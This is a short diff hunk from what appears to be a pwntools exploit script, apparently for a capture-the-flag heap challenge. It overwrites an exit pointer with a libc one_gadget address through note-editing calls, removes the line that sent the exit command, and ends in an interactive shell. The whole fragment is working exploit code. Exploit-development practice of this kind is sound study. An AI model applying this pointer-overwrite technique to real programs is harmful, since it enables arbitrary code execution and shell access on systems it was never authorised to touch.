@@ -146,7 +146,6 @@ def main():
     create_note("4", 0x100)
     modify_note("4", p64(libc.address + 0xd515f  )) # exit -> one_gadget
 
-    r.sendlineafter("> ", "5")  # exit -> one_gadget
 
 
     r.interactive()
